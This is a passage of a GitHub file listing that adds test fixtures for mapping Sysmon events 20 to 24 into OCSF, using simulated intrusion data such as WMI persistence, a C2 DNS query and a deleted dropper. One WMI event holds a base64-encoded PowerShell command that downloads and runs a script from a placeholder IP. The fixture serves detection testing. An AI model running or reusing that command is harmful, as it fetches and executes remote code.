    {
      "sha": "276bb4d689692265a6b42887d505c523899349f6",
      "filename": "sysmon/tests/ocsf/20-WmiEventConsumer.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F20-WmiEventConsumer.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F20-WmiEventConsumer.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F20-WmiEventConsumer.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/20-WmiEventConsumer.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "91967b9892e9c3b031571ad9a33d0b93444a2226",
      "filename": "sysmon/tests/ocsf/20-WmiEventConsumer.txt",
      "status": "added",
      "additions": 56,
      "deletions": 0,
      "changes": 56,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F20-WmiEventConsumer.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F20-WmiEventConsumer.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F20-WmiEventConsumer.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,56 @@\n+{\n+  activity_id: 0,\n+  activity_name: \"Unknown\",\n+  category_name: \"Uncategorized\",\n+  category_uid: 0,\n+  class_name: \"Base Event\",\n+  class_uid: 0,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"20\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"3\",\n+    logged_time: 2025-03-22T10:27:01Z,\n+    original_event_uid: \"1020\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<!-- Sysmon EID 20 \u2013 WmiEventConsumer (Schema 4.90) -->\\n<!-- Fires when a WMI event consumer is registered. -->\\n<!-- Type can be: ActiveScriptEventConsumer, CommandLineEventConsumer, etc. -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>20</EventID>\\n    <Version>3</Version>\\n    <Level>4</Level>\\n    <Task>20</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:27:01.000000000Z\\\"/>\\n    <EventRecordID>1020</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">-</Data>\\n    <Data Name=\\\"EventType\\\">WmiConsumerEvent</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:27:01.000</Data>\\n    <Data Name=\\\"Operation\\\">Created</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"Name\\\">EvilConsumer</Data>\\n    <Data Name=\\\"Type\\\">CommandLineEventConsumer</Data>\\n    <Data Name=\\\"Destination\\\">powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAxADEALgAxADEAMQAuADEAMQAxAC4AMQAxADEALwBzAGgAZQBsAGwAJwApAA==</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1478,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2025-03-22T10:27:01Z,\n+  type_name: \"Base Event: Unknown\",\n+  type_uid: 0,\n+  unmapped: {\n+    System: {\n+      Task: 20,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {\n+      EventType: \"WmiConsumerEvent\",\n+      Operation: \"Created\",\n+      User: \"CORP\\\\jdoe\",\n+      Name: \"EvilConsumer\",\n+      Type: \"CommandLineEventConsumer\",\n+      Destination: \"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAxADEALgAxADEAMQAuADEAMQAxAC4AMQAxADEALwBzAGgAZQBsAGwAJwApAA==\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "b50f4359aad852f19515beb4dac78f681649ad6a",
      "filename": "sysmon/tests/ocsf/21-WmiEventConsumerToFilter.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F21-WmiEventConsumerToFilter.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F21-WmiEventConsumerToFilter.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F21-WmiEventConsumerToFilter.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/21-WmiEventConsumerToFilter.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "dcc0719118a6309e06a4401e67a20f5162ee3fb5",
      "filename": "sysmon/tests/ocsf/21-WmiEventConsumerToFilter.txt",
      "status": "added",
      "additions": 55,
      "deletions": 0,
      "changes": 55,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F21-WmiEventConsumerToFilter.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F21-WmiEventConsumerToFilter.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F21-WmiEventConsumerToFilter.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,55 @@\n+{\n+  activity_id: 0,\n+  activity_name: \"Unknown\",\n+  category_name: \"Uncategorized\",\n+  category_uid: 0,\n+  class_name: \"Base Event\",\n+  class_uid: 0,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"21\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"3\",\n+    logged_time: 2025-03-22T10:27:02Z,\n+    original_event_uid: \"1021\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<!-- Sysmon EID 21 \u2013 WmiEventConsumerToFilter (Schema 4.90) -->\\n<!-- Fires when a WMI consumer is bound to a filter, completing the subscription triad. -->\\n<!-- EIDs 19+20+21 together = full WMI persistence subscription. -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>21</EventID>\\n    <Version>3</Version>\\n    <Level>4</Level>\\n    <Task>21</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:27:02.000000000Z\\\"/>\\n    <EventRecordID>1021</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">-</Data>\\n    <Data Name=\\\"EventType\\\">WmiBindingEvent</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:27:02.000</Data>\\n    <Data Name=\\\"Operation\\\">Created</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"Consumer\\\">CommandLineEventConsumer.Name=\\\"EvilConsumer\\\"</Data>\\n    <Data Name=\\\"Filter\\\">__EventFilter.Name=\\\"EvilFilter\\\"</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1290,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2025-03-22T10:27:02Z,\n+  type_name: \"Base Event: Unknown\",\n+  type_uid: 0,\n+  unmapped: {\n+    System: {\n+      Task: 21,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {\n+      EventType: \"WmiBindingEvent\",\n+      Operation: \"Created\",\n+      User: \"CORP\\\\jdoe\",\n+      Consumer: \"CommandLineEventConsumer.Name=\\\"EvilConsumer\\\"\",\n+      Filter: \"__EventFilter.Name=\\\"EvilFilter\\\"\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "e10c2d697ac92bf634d8b9282647890f1f51b062",
      "filename": "sysmon/tests/ocsf/22-DnsQuery.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F22-DnsQuery.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F22-DnsQuery.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F22-DnsQuery.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/22-DnsQuery.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "8f415c8b67b51e5af640de2666b2eb6e79d4d2b7",
      "filename": "sysmon/tests/ocsf/22-DnsQuery.txt",
      "status": "added",
      "additions": 80,
      "deletions": 0,
      "changes": 80,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F22-DnsQuery.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F22-DnsQuery.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F22-DnsQuery.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,80 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Query\",\n+  actor: {\n+    process: {\n+      file: {\n+        name: \"payload.exe\",\n+        path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\",\n+        type: \"Executable File\",\n+        type_id: 8,\n+      },\n+      name: \"payload.exe\",\n+      path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\",\n+      pid: 4812,\n+      uid: \"{A23EAE89-BD56-67E0-0000-0010E9D95E03}\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"Network Activity\",\n+  category_uid: 4,\n+  class_name: \"DNS Activity\",\n+  class_uid: 4003,\n+  connection_info: {\n+    direction: \"Outbound\",\n+    direction_id: 2,\n+  },\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"22\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"5\",\n+    logged_time: 2025-03-22T10:28:00Z,\n+    original_event_uid: \"1022\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  query: {\n+    hostname: \"c2.xn--q9jyb4c.tld\",\n+    opcode_id: 0,\n+  },\n+  raw_data: \"<!-- Sysmon EID 22 \u2013 DNSEvent (Schema 4.90) -->\\n<!-- Logs DNS queries made by processes. Useful for detecting C2 beaconing and DGA domains. -->\\n<!-- QueryStatus 0 = success; other values are Win32 DNS error codes. -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>22</EventID>\\n    <Version>5</Version>\\n    <Level>4</Level>\\n    <Task>22</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:28:00.000000000Z\\\"/>\\n    <EventRecordID>1022</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">-</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:28:00.000</Data>\\n    <Data Name=\\\"ProcessGuid\\\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\\n    <Data Name=\\\"ProcessId\\\">4812</Data>\\n    <Data Name=\\\"QueryName\\\">c2.xn--q9jyb4c.tld</Data>\\n    <Data Name=\\\"QueryStatus\\\">0</Data>\\n    <Data Name=\\\"Initiated\\\">true</Data>\\n    <Data Name=\\\"QueryResults\\\">type:  5 cdn.xn--q9jyb4c.tld;::ffff:185.220.101.47;</Data>\\n    <Data Name=\\\"Image\\\">C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1458,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  status: \"Success\",\n+  status_code: \"0\",\n+  status_id: 1,\n+  time: 2025-03-22T10:28:00Z,\n+  type_name: \"DNS Activity: Query\",\n+  type_uid: 400301,\n+  unmapped: {\n+    System: {\n+      Task: 22,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {\n+      QueryResults: \"type:  5 cdn.xn--q9jyb4c.tld;::ffff:185.220.101.47;\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "97a3facdc8eabdb5373144453808f1b79c68f659",
      "filename": "sysmon/tests/ocsf/23-FileDelete.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F23-FileDelete.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F23-FileDelete.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F23-FileDelete.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/23-FileDelete.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "ddaa5c181c50f390f5b47402654819e53d0d47fc",
      "filename": "sysmon/tests/ocsf/23-FileDelete.txt",
      "status": "added",
      "additions": 98,
      "deletions": 0,
      "changes": 98,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F23-FileDelete.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F23-FileDelete.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F23-FileDelete.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,98 @@\n+{\n+  activity_id: 4,\n+  activity_name: \"Delete\",\n+  actor: {\n+    process: {\n+      file: {\n+        name: \"payload.exe\",\n+        path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\",\n+        type: \"Executable File\",\n+        type_id: 8,\n+      },\n+      name: \"payload.exe\",\n+      path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\",\n+      pid: 4812,\n+      uid: \"{A23EAE89-BD56-67E0-0000-0010E9D95E03}\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"File System Activity\",\n+  class_uid: 1001,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  file: {\n+    hashes: [\n+      {\n+        algorithm: \"SHA-1\",\n+        algorithm_id: 2,\n+        value: \"AABB1122...\",\n+      },\n+      {\n+        algorithm: \"MD5\",\n+        algorithm_id: 1,\n+        value: \"CCDD3344...\",\n+      },\n+      {\n+        algorithm: \"SHA-256\",\n+        algorithm_id: 3,\n+        value: \"EEFF5566...\",\n+      },\n+      {\n+        algorithm: \"Other\",\n+        algorithm_id: 99,\n+        value: \"77889900...\",\n+      },\n+    ],\n+    is_deleted: true,\n+    name: \"dropper_stage1.exe\",\n+    path: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\dropper_stage1.exe\",\n+    type: \"Executable File\",\n+    type_id: 8,\n+  },\n+  metadata: {\n+    event_code: \"23\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"5\",\n+    logged_time: 2025-03-22T10:29:00Z,\n+    original_event_uid: \"1023\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<!-- Sysmon EID 23 \u2013 FileDelete (Archived) (Schema 4.90) -->\\n<!-- Fires when a file is deleted AND archives a copy to the Sysmon ArchiveDirectory. -->\\n<!-- Archived=true means a copy was saved; useful for recovering deleted malware. -->\\n<!-- For detection-only (no archiving), see EID 26. -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>23</EventID>\\n    <Version>5</Version>\\n    <Level>4</Level>\\n    <Task>23</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:29:00.000000000Z\\\"/>\\n    <EventRecordID>1023</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">-</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:29:00.000</Data>\\n    <Data Name=\\\"ProcessGuid\\\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\\n    <Data Name=\\\"ProcessId\\\">4812</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"Image\\\">C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe</Data>\\n    <Data Name=\\\"TargetFilename\\\">C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\dropper_stage1.exe</Data>\\n    <Data Name=\\\"Hashes\\\">SHA1=AABB1122...,MD5=CCDD3344...,SHA256=EEFF5566...,IMPHASH=77889900...</Data>\\n    <Data Name=\\\"IsExecutable\\\">true</Data>\\n    <Data Name=\\\"Archived\\\">true</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1588,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2025-03-22T10:29:00Z,\n+  type_name: \"File System Activity: Delete\",\n+  type_uid: 100104,\n+  unmapped: {\n+    System: {\n+      Task: 23,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {\n+      Archived: true,\n+    },\n+  },\n+}"
    },
    {
      "sha": "550d11b9e68f94e3127eb5824ba7fc75f66cec4d",
      "filename": "sysmon/tests/ocsf/24-ClipboardChange.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F24-ClipboardChange.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F24-ClipboardChange.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F24-ClipboardChange.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/24-ClipboardChange.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure deterministic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "cf1a445541310198bf18697cc3eae06b6fb5fac0",
      "filename": "sysmon/tests/ocsf/24-ClipboardChange.txt",
      "status": "added",
      "additions": 58,
      "deletions": 0,
      "changes": 58,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F24-ClipboardChange.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F24-ClipboardChange.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F24-ClipboardChange.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,58 @@\n+{\n+  activity_id: 0,\n+  activity_name: \"Unknown\",\n+  category_name: \"Uncategorized\",\n+  category_uid: 0,\n+  class_name: \"Base Event\",\n+  class_uid: 0,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  metadata: {\n+    event_code: \"24\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"5\",\n+    logged_time: 2025-03-22T10:30:00Z,\n+    original_event_uid: \"1024\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  raw_data: \"<!-- Sysmon EID 24 \u2013 ClipboardChange (Schema 4.90) -->\\n<!-- Fires when clipboard contents change. Can detect credential harvesting via clipboard. -->\\n<!-- Archived field indicates whether the clipboard content was saved to ArchiveDirectory. -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>24</EventID>\\n    <Version>5</Version>\\n    <Level>4</Level>\\n    <Task>24</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:30:00.000000000Z\\\"/>\\n    <EventRecordID>1024</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">-</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:30:00.000</Data>\\n    <Data Name=\\\"ProcessGuid\\\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\\n    <Data Name=\\\"ProcessId\\\">4812</Data>\\n    <Data Name=\\\"Image\\\">C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe</Data>\\n    <Data Name=\\\"Session\\\">1</Data>\\n    <Data Name=\\\"ClientInfo\\\">WORKSTATION01\\\\jdoe</Data>\\n    <Data Name=\\\"Hashes\\\">SHA256=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B</Data>\\n    <Data Name=\\\"Archived\\\">true</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 1495,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  time: 2025-03-22T10:30:00Z,\n+  type_name: \"Base Event: Unknown\",\n+  type_uid: 0,\n+  unmapped: {\n+    System: {\n+      Task: 24,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {\n+      ProcessGuid: \"{A23EAE89-BD56-67E0-0000-0010E9D95E03}\",\n+      ProcessId: 4812,\n+      Image: \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\payload.exe\",\n+      Session: 1,\n+      ClientInfo: \"WORKSTATION01\\\\jdoe\",\n+      Hashes: \"SHA256=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B\",\n+      Archived: true,\n+      User: \"CORP\\\\jdoe\",\n+    },\n+  },\n+}"
    },
    {
      "sha": "de274ec1eb89fa2c59328e3b4c6984865ba3fac5",
      "filename": "sysmon/tests/ocsf/25-ProcessTampering.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F25-ProcessTampering.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F25-ProcessTampering.tql",
